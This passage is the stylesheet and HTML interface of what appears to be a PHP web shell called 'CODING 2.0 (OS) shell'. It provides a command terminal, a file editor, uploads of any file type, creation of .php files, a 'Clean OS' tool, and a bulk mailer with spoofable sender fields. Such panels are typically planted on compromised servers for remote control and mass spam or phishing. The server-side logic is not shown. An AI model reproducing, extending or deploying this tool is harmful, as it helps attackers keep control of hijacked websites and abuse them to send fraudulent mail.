        .overlay-terminal { position: fixed; inset: 0; background: rgba(8,10,12,0.35); backdrop-filter: blur(8px) saturate(120%); display:none; align-items:center; justify-content:center; z-index: 9999; }
        .overlay-terminal.show { display:flex; }
        .terminal-modal { width: 560px; max-width: 92vw; border-radius: 12px; border:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.22); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; }
        .terminal-modal .titlebar { display:flex; align-items:center; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; }
        .terminal-modal .titlebar .traffic { margin-right:10px; }
        .terminal-modal .titlebar .term-close { margin-left:8px; border:1px solid rgba(255,255,255,0.08); background: transparent; color: rgba(255,0,0,0.75); width:28px; height:24px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; cursor:pointer; }
        .terminal-modal .titlebar .term-close:hover { background: rgba(255,255,255,0.06); }
        .terminal-modal .title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .terminal-modal .title .material-symbols-rounded { font-size:20px; color:#9fd08a; vertical-align:-4px; }
        .terminal-modal .body { padding:16px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; background: rgba(10,12,16,0.18); border-radius: 0 0 12px 12px; }
        .terminal-modal .output { min-height: 120px; white-space: pre-wrap; color:#9fd08a; }
        .terminal-modal .cursor { display:inline-block; width:10px; background:#9fd08a; animation: blink 1s steps(1) infinite; vertical-align: -2px; }
        /* Error theme for terminal overlay (red output, red cursor, red icon) */
        .overlay-terminal.error-theme .terminal-modal .title .material-symbols-rounded { color:#ff6b6b; }
        .overlay-terminal.error-theme .terminal-modal .output { color:#ff6b6b; }
        .overlay-terminal.error-theme .terminal-modal .cursor { background:#ff6b6b; }
        /* Transparent red backgrounds for error-themed terminal */
        /* Removed red-tinted backgrounds per request; keep only red text/cursor/icon for errors */
        @keyframes blink { 50% { opacity:0; } }
        .btn-rename:hover { color:#ffffff; }
        .btn-rename .material-symbols-rounded { color: LawnGreen; }
        /* Edit button styling: white text, LemonChiffon icon */
        .btn-edit { color:#ffffff; }
        .btn-edit:hover { color:#ffffff; }
        .btn-edit .material-symbols-rounded { color:#FFFACD; }
        /* Zip/Unzip button styling: SeaGreen icons */
        .btn-zip .material-symbols-rounded { color:#2E8B57; }
        .btn-unzip .material-symbols-rounded { color:#2E8B57; }
        .pill { display:inline-block; padding:2px 8px; border:1px solid #3b3f53; border-radius:10px; font-size:12px; }
        .error { background: rgba(255, 0, 0, 0.10); border:1px solid rgba(255, 0, 0, 0.28); color:#ffd7d7; padding:8px 10px; border-radius:6px; margin:12px auto; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; width:fit-content; }
        .error .material-symbols-rounded { color:#ffd7d7; font-size:20px; }
  /* Centered error variant for destructive actions */
  .error.error-center { display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; }
  .error.error-center .material-symbols-rounded { color:#f7d7d7; }
        .notice { background: rgba(46, 139, 87, 0.10); border:1px solid rgba(46, 139, 87, 0.28); color:#d7f7e7; padding:10px 14px; border-radius:8px; margin:14px auto; max-width:640px; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; box-shadow: 0 6px 14px rgba(0,0,0,0.35); }
        .notice .material-symbols-rounded { color:#d7f7e7; }
        footer { padding:12px 20px; border-top:1px solid #2e313d; color:#9aa3af; font-size:12px; }
        .breadcrumb a { margin-right:8px; }
        .breadcrumb .sep { margin-right:8px; color:#586073; }
        .go-up a { display:inline-flex; align-items:center; gap:6px; }
        .go-up .material-symbols-rounded { animation: goUpBounce 1.2s ease-in-out infinite; will-change: transform, opacity; }
        @keyframes goUpBounce {
            0% { transform: translateY(0); opacity: 0.9; }
            50% { transform: translateY(-5px); opacity: 1; }
            100% { transform: translateY(0); opacity: 0.9; }
        }
        /* Transparent terminal-style editor */
        .editor-wrap { max-width: 900px; margin: 12px auto; }
        .editor-area { width:100%; display:block; min-height:220px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; color:var(--text); background: transparent; border:1px dashed var(--border); border-radius:8px; padding:10px 12px; resize:vertical; caret-color: var(--accent); outline:none; }
        .editor-area:focus { border-color: var(--accentDim); box-shadow: 0 0 0 1px rgba(134,245,139,0.25); background: rgba(10,12,16,0.18); backdrop-filter: blur(6px) saturate(120%); }
        .editor-area::selection { background: rgba(134,245,139,0.25); }
        .editor-actions { text-align: center; }
        /* Spotlight-style pill inputs */
        .form-actions { text-align:center; }
        .input-pill { display:flex; align-items:center; gap:10px; padding:10px 16px; border:1px solid var(--border); border-radius:9999px; background: rgba(46,49,57,0.55); backdrop-filter: blur(12px) saturate(120%); box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 6px 14px rgba(0,0,0,0.35); color:var(--text); }
        .input-pill .material-symbols-rounded { font-size:18px; color:#cbd5e1; }
        .input-pill input, .input-pill select { flex:1; background: transparent; border:0; outline:none; color:var(--text); font-size: var(--textBase); padding:6px 2px; }
        .input-pill input::placeholder { color:#9aa3af; }
        /* Terminal window chrome */
.terminal-chrome { max-width:1100px; margin:18px auto 0; padding:10px 24px; background: rgba(46,49,57,0.55); border:1px solid var(--border); border-bottom:none; border-radius:12px 12px 0 0; backdrop-filter: blur(12px) saturate(120%); box-shadow: 0 12px 22px rgba(0,0,0,0.35); }
        .terminal-bar { display:flex; align-items:center; gap:12px; }
        .traffic { display:flex; gap:8px; }
        .traffic .dot { width:12px; height:12px; border-radius:50%; box-shadow: inset 0 1px 0 rgba(255,255,255,0.15), 0 1px 2px rgba(0,0,0,0.35); }
        .traffic .dot.red { background:#ff5f56; }
        .traffic .dot.yellow { background:#ffbd2e; cursor:pointer; }
        .traffic .dot.yellow:hover { filter: brightness(0.95); }
        .traffic .dot.green { background:#27c93f; }
        /* Logout button: red close dot with black × */
        .traffic .dot.logout { position:relative; cursor:pointer; }
        .traffic .dot.logout::after { content:"×"; position:absolute; left:0; top:0; width:100%; height:100%; display:flex; align-items:center; justify-content:center; color:#000; font-weight:800; font-size:10px; line-height:1; }
        .traffic .dot.logout:hover { filter: brightness(0.95); }
        .term-title { flex:1; text-align:center; color:#cfd6df; font-size:14px; font-weight:600; letter-spacing:0.2px; }
        .term-title a { color:#cfd6df; text-decoration:none; }
        .term-title a:hover { color:#e3e8ee; }
        .term-title a.disabled { pointer-events:none; opacity:0.7; cursor:not-allowed; }
        .term-title .path-root { color:#cfd6df; }
        .term-title .material-symbols-rounded { font-size:18px; color:#9fd08a; vertical-align:-4px; }
        .term-action { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; }
        .term-action:hover { background: rgba(255,255,255,0.06); }
        .term-action.term-back .material-symbols-rounded { color:#2ecc71; }
        .term-action.term-new .material-symbols-rounded { color:#ff9800; }
        /* Hide macOS-style traffic dots in terminal overlays only */
        .overlay-terminal .titlebar .traffic { display:none !important; }
        /* Icon-only actions inside forms */
        .icon-action { width:30px; height:30px; border-radius:15px; border:1px solid var(--border); display:inline-flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; margin:0 6px; vertical-align:middle; }
        .icon-action:hover { background: rgba(255,255,255,0.06); }
        .icon-action .material-symbols-rounded { font-size:22px; }
        .icon-action.icon-confirm .material-symbols-rounded { color:#2ecc71; }
        .icon-action.icon-cancel .material-symbols-rounded { color:#aab3be; }
        /* Login button: bigger green fingerprint icon, red on hover (scan effect) */
        #login-submit { width:34px; height:34px; border-radius:17px; position:relative; overflow:hidden; transition: background .2s ease, box-shadow .2s ease, border-color .2s ease; }
        #login-submit .material-symbols-rounded { font-size:32px; color:#2ecc71; transition: color .2s ease, transform .2s ease; }
        #login-submit:hover { background: rgba(255,0,0,0.12); border-color: rgba(255,0,0,0.55); box-shadow: 0 0 10px rgba(255,0,0,0.35); }
        #login-submit:hover .material-symbols-rounded { color:#ff3b3b; transform: scale(1.1); }
        /* Scanning sweep line */
        #login-submit::after { content:""; position:absolute; left:0; top:-100%; width:100%; height:100%; background: linear-gradient(to bottom, rgba(255,0,0,0) 0%, rgba(255,0,0,0.32) 50%, rgba(255,0,0,0) 100%); pointer-events:none; }
        #login-submit:hover::after { animation: scan-sweep .9s ease-in-out; }
        @keyframes scan-sweep { 0% { top:-100%; } 100% { top:100%; } }
        .command-pill { margin-top:10px; border:1px solid var(--border); border-radius:9999px; padding:8px 12px; color:#b6bec8; text-align:center; background: rgba(255,255,255,0.06); }
        /* Dock icons styling (match header app icon design) */
        #terminal-dock, #notes-dock, #browser-dock, #cmd-dock, #wallpaper-dock, #mailer-dock, #settings-dock { position: fixed; inset: 0; z-index: 9998; pointer-events: none; }
        .dock-terminal, .dock-notes, .dock-browser, .dock-cmd, .dock-wallpaper, .dock-mailer, .dock-settings { display:flex; align-items:center; justify-content:center; cursor:pointer; color:#cfd6df; background:transparent; pointer-events:auto; position: fixed; }
.dock-terminal.app-icon, .dock-notes.app-icon, .dock-browser.app-icon, .dock-cmd.app-icon, .dock-wallpaper.app-icon, .dock-mailer.app-icon, .dock-settings.app-icon { width:48px; height:48px; border-radius:12px; background: rgba(20,22,26,0.22); backdrop-filter: blur(6px) saturate(115%); left:50%; top:50%; transform: translate(-50%, -50%); }
        /* Wallpaper dock uses same placement as others when minimized */
        .dock-terminal.app-icon:hover, .dock-notes.app-icon:hover, .dock-browser.app-icon:hover, .dock-cmd.app-icon:hover, .dock-wallpaper.app-icon:hover, .dock-mailer.app-icon:hover, .dock-settings.app-icon:hover { background: rgba(20,22,26,0.30); }
        .dock-terminal .material-symbols-rounded, .dock-browser .material-symbols-rounded, .dock-wallpaper .material-symbols-rounded { font-size:28px; color:#ffffff; }
        .dock-notes .material-symbols-rounded { font-size:28px; color: Khaki; }
        .dock-cmd .material-symbols-rounded { font-size:28px; color:#ffffff; }
        .dock-mailer .material-symbols-rounded { font-size:28px; color:#4285f4; }
.dock-settings .material-symbols-rounded { font-size:28px; color:#cfd6df; }
.dock-terminal .logo-spinner { width:28px; height:28px; }
.dock-browser .browser-os-icon, .dock-browser .browser-os-icon-2 { width:28px; height:28px; }
        /* Visible labels for dock icons */
        .dock-terminal::after, .dock-notes::after, .dock-browser::after, .dock-cmd::after, .dock-wallpaper::after, .dock-mailer::after, .dock-settings::after {
            content: attr(data-label);
            position: absolute;
            top: calc(100% + 6px);
            left: 50%;
            transform: translateX(-50%);
            font-size: 11px;
            line-height: 1;
            color: #ffffff;
            background: rgba(20,22,26,0.22);
            backdrop-filter: blur(6px) saturate(1.2);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 10px;
            padding: 4px 8px;
            white-space: nowrap;
            pointer-events: none;
            opacity: 1;
            font-weight: 600;
        }
        /* Flip label above when near bottom */
.dock-terminal.label-top::after, .dock-notes.label-top::after, .dock-browser.label-top::after, .dock-cmd.label-top::after, .dock-wallpaper.label-top::after, .dock-mailer.label-top::after, .dock-settings.label-top::after { top: auto; bottom: calc(100% + 6px); }
        .dock-terminal .dock-label, .dock-notes .dock-label, .dock-browser .dock-label, .dock-cmd .dock-label, .dock-wallpaper .dock-label, .dock-mailer .dock-label, .dock-settings .dock-label { display:none; }
        /* Minimized layout: hide main sections */
        body.minimized .terminal-chrome,
        body.minimized .container { display:none !important; }
        /* Centered section titles with icons */
        .section-title { display:flex; align-items:center; justify-content:center; gap:8px; font-size:18px; margin:18px 0; color:var(--text); }
        .section-title .material-symbols-rounded { font-size:22px; color:var(--accent); vertical-align: -4px; }
        .form-wrap { max-width: 720px; margin: 12px auto; }
        .editor-actions { text-align:center; }
        /* Upload UI */
        .upload-row { display:none; } /* Hide add_circle and arrow_back icons */
        .upload-row .material-symbols-rounded { font-size:22px; }
        .upload-pill { display:flex; align-items:center; justify-content:center; gap:0; padding:20px; border:1px dashed var(--border); border-radius:9999px; background: transparent; color:#cbd5e1; cursor:pointer; }
        /* Upload icon color: blue */
        .upload-pill .material-symbols-rounded { font-size:32px; color:#3b82f6; }
        .term-action.term-upload .material-symbols-rounded { color:#3b82f6; }
        .upload-label { display:none; } /* Hide "Choose a file..." text */
        /* Ellipsis for long filenames in listing */
        .name-ellipsis { display:block; width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .upload-pill input[type="file"] { position:absolute; left:-9999px; width:1px; height:1px; opacity:0; }
        /* Logo: CODING 2.0.. with animated O */
        .logo-title { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; letter-spacing:0.5px; color:var(--text); margin:0 0 6px; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; text-transform: uppercase; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
        .logo-text { display:inline-block; }
        .logo-o { display:inline-flex; width:24px; height:24px; align-items:center; justify-content:center; }
        .logo-spinner { width:24px; height:24px; }
        .logo-spinner circle.base { opacity:0.28; }
        .logo-spinner circle.dot { fill: LawnGreen; }
        .logo-spinner circle.spin { transform-origin:12px 12px; animation: spin 1.2s linear infinite; }
        .logo-credit { font-size: 11px; font-weight: normal; color: #666; font-family: Arial, sans-serif; letter-spacing: 1px; margin-top: 2px; text-transform: lowercase; text-shadow: none; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        /* Typewriter hacking-style effect for footer title */
        .typewriter { display:flex; align-items:center; justify-content:center; gap:8px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; color:#cfd6df; padding:10px 0; }
        .typewriter .material-symbols-rounded { color:#9fd08a; font-size:20px; }
        .typewriter .tw-text { display:inline-block; overflow:hidden; white-space:nowrap; border-right: 2px solid #9fd08a; /* cursor */ width: 0ch; }
        @keyframes tw-type { from { width: 0ch; } to { width: var(--chars, 24)ch; } }
        @keyframes tw-cursor { 0% { opacity:1; } 49% { opacity:1; } 50% { opacity:0; } 100% { opacity:0; } }
        .typewriter .tw-text { animation: tw-type var(--duration, 2400ms) steps(var(--steps, 24)) both; }
        .typewriter .tw-cursor { width:2px; height:1.2em; background:#9fd08a; display:inline-block; animation: tw-cursor 1s step-end infinite; margin-left:2px; }
        /* Unified text size across the UI */
        :root { --textBase: 14px; }
        header, .container, footer, table, h1, .path, thead th, tbody td, .term-title, .section-title, .command-pill, .logo-title, .logo-credit, .pill { font-size: var(--textBase) !important; }
        input, textarea, select { font-size: var(--textBase) !important; }
        /* Traffic controls styled like term-action buttons */
        .traffic .term-action { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; background:transparent; }
        .traffic .term-action .material-symbols-rounded { font-size:18px; }
        .traffic .term-action:hover { background: rgba(255,255,255,0.06); }
        .traffic .term-action.term-logout .material-symbols-rounded { color:#ff5f56; }
        .traffic .term-action.term-minimize .material-symbols-rounded { color:#ffbd2e; }
        /* About overlay modal */
        #about-overlay { position: fixed; inset:0; background: rgba(0,0,0,0.55); backdrop-filter: blur(2px); display:none; align-items:center; justify-content:center; z-index: 10000; }
        #about-overlay.show { display:flex; }
        .about-modal { width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.9); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; }
        .about-header { display:flex; align-items:center; justify-content: space-between; padding: 12px 16px; border-bottom:1px solid var(--border); }
        .about-title { display:flex; align-items:center; gap:10px; font-weight:700; }
        .about-body { padding:16px; display:flex; flex-direction:column; gap:12px; }
        .about-logo { display:flex; align-items:center; justify-content:center; }
        .about-desc { text-align:center; color:#cfd6df; }
        .about-meta { display:flex; flex-wrap:nowrap; justify-content:center; gap:14px; color:#94a3b8; }
        .about-meta .item { display:flex; align-items:center; gap:6px; }
        .about-meta .item.latest .material-symbols-rounded { color:#3b82f6; }
        .about-meta .item.system .material-symbols-rounded { color:#2ecc71; }
        .about-meta .item.copyright .material-symbols-rounded { color:#ff5f56; }
        .about-close { background:transparent; border:none; color: rgba(255,0,0,0.75); cursor:pointer; }
        .about-close .material-symbols-rounded { font-size:20px; color: rgba(255,0,0,0.75); }
    </style>
</head>
<body>
    <header>
        <div class="header-bar">
            <div class="logo-area">
                <h1 class="logo-title" aria-label="CODING 2.0">
                    <span class="logo-text">C</span>
                    <span class="logo-o" aria-hidden="true">
                        <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                            <circle class="base" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" />
                            <circle class="spin" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                            <circle class="dot" cx="12" cy="12" r="2" />
                        </svg>
                    </span>
                    <span class="logo-text">DING 2.0..</span>  <div class="logo-credit">(OS) shell</div>
                </h1>
            </div>
            <div class="app-icons" aria-label="App shortcuts">
                <a class="app-icon" href="https://t.me/misterklio" target="_blank" rel="noopener" title="Telegram" aria-label="Telegram" data-label="Telegram">
                    <i class="fa-brands fa-telegram"></i>
                </a>
                <a class="app-icon" href="#" id="wallpaper-trigger" title="Wallpaper" aria-label="Wallpaper" data-label="Wallpaper">
                    <span class="material-symbols-rounded">wallpaper</span>
                </a>
                <a class="app-icon" href="#" id="browser-trigger" title="Browser" aria-label="Browser" data-label="Browser">
                    <svg class="browser-os-icon-2" viewBox="0 0 24 24" role="img" aria-label="Browser OS icon alt">
                        <circle class="ring" cx="12" cy="12" r="8" stroke-width="2" fill="none" />
                        <circle class="c-arc" cx="12" cy="12" r="8" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="30" stroke-dashoffset="6" />
                        <circle class="scan" cx="12" cy="12" r="8" stroke-width="2" fill="none" stroke-linecap="round" stroke-dasharray="20" stroke-dashoffset="14" />
                        <circle class="dot" cx="12" cy="12" r="1.8" />
                    </svg>
                </a>
                <a class="app-icon" href="#" id="mailer-trigger" title="Mailer" aria-label="Mailer" data-label="Mailer">
                    <span class="material-symbols-rounded">mail</span>
                </a>
                <a class="app-icon" href="#" id="notes-trigger" title="Notes" aria-label="Notes" data-label="Notes">
                    <span class="material-symbols-rounded">edit_note</span>
                </a>
                <a class="app-icon" href="#" id="cmd-trigger" title="CMD" aria-label="CMD" data-label="CMD">
                    <span class="material-symbols-rounded">terminal</span>
                </a>
                <a class="app-icon" href="#" id="apptools-trigger" title="APPTools 1.0" aria-label="APPTools 1.0" data-label="APPTools 1.0">
                    <svg class="apptools-icon" viewBox="0 0 24 24" role="img" aria-label="APPTools app store icon">
                        <defs>
                            <linearGradient id="apptoolsGrad" x1="0" y1="0" x2="1" y2="1">
                                <stop offset="0%" stop-color="LawnGreen"/>
                                <stop offset="100%" stop-color="#2ecc71"/>
                            </linearGradient>
                        </defs>
                        <g fill="none" stroke="url(#apptoolsGrad)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <!-- Store bag with star badge -->
                            <path d="M7 9 h10 c1 0 1 1 1 2 v6 c0 1 -1 2 -2 2 H8 c-1 0 -2 -1 -2 -2 v-6 c0 -1 0 -2 1 -2 z" />
                            <path d="M9 9 c0 -2 1.5 -3 3 -3 s3 1 3 3" />
                            <circle cx="17.5" cy="8.5" r="2.2" />
                            <path d="M17.5 7.6 l0.6 1.2 l1.3 0.2 l-1 0.9 l0.2 1.3 l-1.1 -0.6 l-1.1 0.6 l0.2 -1.3 l-1 -0.9 l1.3 -0.2 z" />
                        </g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="clean-trigger" title="Clean OS" aria-label="Clean OS" data-label="Clean OS">
                    <svg class="clean-icon" viewBox="0 0 24 24" role="img" aria-label="Clean OS icon">
                        <defs>
                            <linearGradient id="cleanGrad" x1="0" y1="0" x2="1" y2="1">
                                <stop offset="0%" stop-color="LawnGreen"/>
                                <stop offset="100%" stop-color="#2ecc71"/>
                            </linearGradient>
                        </defs>
                        <g fill="none" stroke="url(#cleanGrad)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path class="broom-stick" d="M4 20 L18 6"/>
                            <path class="broom-head" d="M16 8 C15 10, 13 12, 11 13"/>
                            <path class="broom-bristle" d="M12 12 C11 13, 9 14, 7 15"/>
                            <circle class="sparkle s1" cx="8" cy="6" r="1"/>
                            <circle class="sparkle s2" cx="20" cy="12" r="1.2"/>
                            <circle class="sparkle s3" cx="12" cy="20" r="1"/>
                        </g>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="trash-trigger" title="Trash" aria-label="Trash" data-label="Trash">
                    <svg class="trash-icon" viewBox="0 0 24 24" role="img" aria-label="Trash icon">
                        <rect x="7" y="8" width="10" height="12" rx="2" fill="currentColor" />
                        <rect x="5" y="6" width="14" height="2" rx="1" fill="currentColor" />
                        <path d="M9 4h6l1 2H8l1-2z" fill="currentColor" />
                    </svg>
                </a>
                <a class="app-icon" href="?os=<?= h(urlencode($BASE_DIR)) ?>" title="Home" aria-label="Home" data-label="Home">
                    <span class="material-symbols-rounded ic-folder">folder_open</span>
                </a>
                <a class="app-icon" href="#" id="about-trigger" title="About" aria-label="About" data-label="About">
                    <span class="material-symbols-rounded">account_circle</span>
                </a>
                <a class="app-icon" href="?logout=1" id="logout-trigger" title="Logout" aria-label="Logout" data-label="Logout">
                    <span class="material-symbols-rounded">logout</span>
                </a>
            </div>
        </div>
    </header>
    <!-- Notes popup template (cloned for each new window) -->
    <div class="notes-window" id="notes-template" role="dialog" aria-label="Notes" style="display:none;">
        <div class="notes-titlebar">
            <div class="notes-title">Notes</div>
            <button class="notes-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="notes-body">
            <div class="notes-list" aria-live="polite"></div>
        </div>
        <div class="notes-actions">
            <button class="btn notes-add" type="button" title="New notes window" aria-label="New notes window"><span class="material-symbols-rounded">note_add</span></button>
            <div style="flex:1"></div>
            <button class="btn notes-clear" type="button" title="Clear all" aria-label="Clear all"><span class="material-symbols-rounded">delete</span></button>
        </div>
    </div>
    <!-- Layer to hold multiple notes windows -->
    <div id="notes-layer"></div>
    <!-- Mailer popup template -->
    <div class="mailer-window" id="mailer-template" role="dialog" aria-label="Mailer" style="display:none;">
        <div class="mailer-titlebar">
            <div class="mailer-title">Mailer</div>
            <button class="mailer-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="mailer-body">
            <form class="mailer-form" id="mailer-form">
                <div class="mailer-field">
                    <label for="mailer-from-email"><span class="material-symbols-rounded" aria-hidden="true">alternate_email</span><span>From Email</span></label>
                    <input type="email" id="mailer-from-email" name="from_email" placeholder="sender@example.com" required>
                </div>
                <div class="mailer-field">
                    <label for="mailer-from-name"><span class="material-symbols-rounded" aria-hidden="true">person</span><span>From Name</span></label>
                    <input type="text" id="mailer-from-name" name="from_name" placeholder="Your Name" required>
                </div>
                <div class="mailer-field">
                    <label for="mailer-subject"><span class="material-symbols-rounded" aria-hidden="true">subject</span><span>Subject</span></label>
                    <input type="text" id="mailer-subject" name="subject" placeholder="Email Subject" required>
                </div>
                <div class="mailer-field">
                    <label for="mailer-recipients"><span class="material-symbols-rounded" aria-hidden="true">group</span><span>Recipients (one per line)</span></label>
                    <textarea id="mailer-recipients" name="recipients" placeholder="recipient1@example.com&#10;recipient2@example.com" rows="4" required></textarea>
                </div>
                <div class="mailer-field">
                    <label for="mailer-message"><span class="material-symbols-rounded" aria-hidden="true">description</span><span>Message Body</span></label>
                    <div class="mailer-format-toggle">
                        <label><input type="radio" name="format" value="text" checked><span class="material-symbols-rounded" aria-hidden="true">text_fields</span><span>Text</span></label>
                        <label><input type="radio" name="format" value="html"><span class="material-symbols-rounded" aria-hidden="true">code</span><span>HTML</span></label>
                    </div>
                    <textarea id="mailer-message" name="message" placeholder="Your message here..." rows="8" required></textarea>
                </div>
                <div class="mailer-actions">
                    <button type="button" class="btn mailer-send btn-icon" id="mailer-send-btn" title="Send" aria-label="Send" data-label="Send">
                        <span class="material-symbols-rounded">send</span>
                    </button>
                    <div class="mailer-status" id="mailer-status"></div>
                </div>
            </form>
            <div class="mailer-output" id="mailer-output" aria-live="polite" aria-label="Send output"></div>
        </div>
    </div>
    <!-- Layer to hold mailer windows -->
    <div id="mailer-layer"></div>
    <!-- Browser popup template -->
    <div class="browser-window" id="browser-template" role="dialog" aria-label="Browser" style="display:none;">
        <div class="browser-titlebar">
            <div class="browser-title">Browser</div>
            <button class="browser-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="browser-body landing">
            <div class="browser-landing" role="document">
                <div class="landing-logo" aria-label="CODING 2.0">
                    <span class="logo-text">C</span>
                    <span class="logo-o" aria-hidden="true">
                        <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                            <circle class="base" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" />
                            <circle class="spin" cx="12" cy="12" r="9" stroke="LawnGreen" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                            <circle class="dot" cx="12" cy="12" r="2" />
                        </svg>
                    </span>
                    <span class="logo-text">DING 2.0</span>
                </div>
                <div class="landing-small" aria-hidden="true">search</div>
                <form class="landing-form" aria-label="Search or type URL">
                    <input class="landing-input" type="text" placeholder="Search or type URL" />
                    <button class="landing-submit" type="submit"><span class="material-symbols-rounded">search</span><span>Search</span></button>
                </form>
                <div class="landing-tip">Press Enter to search with Google, or type a full URL.</div>
            </div>
            <div class="browser-controls">
                <input class="browser-url" type="text" placeholder="Search or type URL">
                <button class="browser-go browser-go-btn" type="button" title="Go" aria-label="Go"><span class="material-symbols-rounded">arrow_forward</span><span>Go</span></button>
                <a class="browser-go browser-open-link" target="_blank" rel="noopener" title="Open in new tab" aria-label="Open in new tab"><span class="material-symbols-rounded">open_in_new</span><span>Open</span></a>
            </div>
            <iframe class="browser-frame" aria-label="Embedded site"></iframe>
            <div class="browser-help">Searches and URLs open in a new window. Use “Open” to re-launch the current address.</div>
        </div>
    </div>
    <!-- Layer to hold browser windows -->
    <div id="browser-layer"></div>
    <!-- Editor popup template -->
    <div class="editor-window" id="editor-template" role="dialog" aria-label="Editor" style="display:none;">
        <div class="editor-titlebar">
            <div class="editor-title">Edit File</div>
            <button class="editor-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="editor-body">
            <textarea class="editor-textarea" spellcheck="false" aria-label="File content"></textarea>
        </div>
        <div class="editor-footer">
            <button class="editor-save" type="button" title="Save" aria-label="Save"><span class="material-symbols-rounded">check_circle</span><span>Save</span></button>
        </div>
    </div>
    <!-- Layer to hold editor windows -->
    <div id="editor-layer"></div>
    <!-- Upload popup template -->
    <div class="upload-window" id="upload-template" role="dialog" aria-label="Upload" style="display:none;">
        <div class="upload-titlebar">
            <div class="upload-title"><span class="material-symbols-rounded" aria-hidden="true">file_upload</span> Upload</div>
            <button class="upload-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="upload-body">
            <form class="upload-form" enctype="multipart/form-data">
                <div class="upload-pill" style="margin:12px auto; max-width:480px;">
                    <span class="material-symbols-rounded">file_upload</span>
                    <label for="upload-file" class="upload-label" title="Choose a file…">Choose a file…</label>
                    <input type="file" id="upload-file" name="upload" accept="*/*">
                </div>
                <div class="upload-actions" style="text-align:right; padding:8px 10px;">
                    <button class="icon-action icon-confirm upload-submit" type="submit" title="Upload"><span class="material-symbols-rounded">check_circle</span></button>
                </div>
            </form>
        </div>
    </div>
    <!-- Layer to hold Upload windows -->
    <div id="upload-layer"></div>
    <!-- New (Add) popup template -->
    <div class="add-window" id="add-template" role="dialog" aria-label="New" style="display:none;">
        <div class="add-titlebar">
            <div class="add-title"><span class="material-symbols-rounded" aria-hidden="true">add_circle</span> New</div>
            <button class="add-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="add-body">
            <form class="add-form">
                <p style="text-align:center; margin-bottom:12px;">
                    <label style="margin-right:14px;"><input type="radio" name="create_type" value="file" checked> File</label>
                    <label><input type="radio" name="create_type" value="folder"> Folder</label>
                </p>
                <div style="display:grid; grid-template-columns: 1fr; gap:12px;">
                    <div class="input-pill"><span class="material-symbols-rounded">description</span><input type="text" name="file_name" placeholder="File name (base)" autocomplete="off"></div>
                    <div class="input-pill"><span class="material-symbols-rounded">extension</span><select name="file_ext"><option value="php">.php</option><option value="html">.html</option><option value="txt">.txt</option></select></div>
                    <div class="input-pill"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder_name" placeholder="Folder name" autocomplete="off"></div>
                </div>
                <p class="form-actions" style="text-align:right; padding:8px 10px;"><button class="icon-action icon-confirm add-submit" type="submit" title="Create"><span class="material-symbols-rounded">check_circle</span></button></p>
            </form>
        </div>
    </div>
    <!-- Layer to hold New windows -->
    <div id="add-layer"></div>
    <!-- Settings popup template -->
    <div class="settings-window" id="settings-template" role="dialog" aria-label="Settings" style="display:none;">
        <div class="settings-titlebar">
            <div class="settings-title">Settings</div>
            <button class="settings-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">close</span></button>
        </div>
        <div class="settings-body">
            <div class="settings-row">
                <div class="label">Current password</div>
                <span class="material-symbols-rounded pw-icon" aria-hidden="true">password</span>
                <input class="settings-input" type="password" id="set-current" placeholder="Enter current password" aria-label="Current password" />
                <button class="settings-eye" type="button" id="set-cur-toggle" title="Show/Hide"><span class="material-symbols-rounded">visibility</span></button>
            </div>
            <div class="settings-row">
                <div class="label">New password</div>
                <span class="material-symbols-rounded pw-icon" aria-hidden="true">password</span>
                <input class="settings-input" type="password" id="set-new" placeholder="Enter new password" aria-label="New password" />
